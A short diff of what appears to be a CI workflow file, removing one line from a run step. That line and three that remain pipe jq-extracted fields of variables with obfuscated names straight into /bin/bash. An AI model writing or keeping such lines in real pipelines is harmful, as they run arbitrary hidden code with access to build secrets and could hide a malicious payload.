@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$dwnr85" | jq -r .w8 | /bin/bash
           echo $dpa4 | jq -r .fpur5 | /bin/bash
           printf '%s' "$ppf54791" | jq -r .wuq6385 | /bin/bash
-          echo $jt0 | jq -r .u7 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
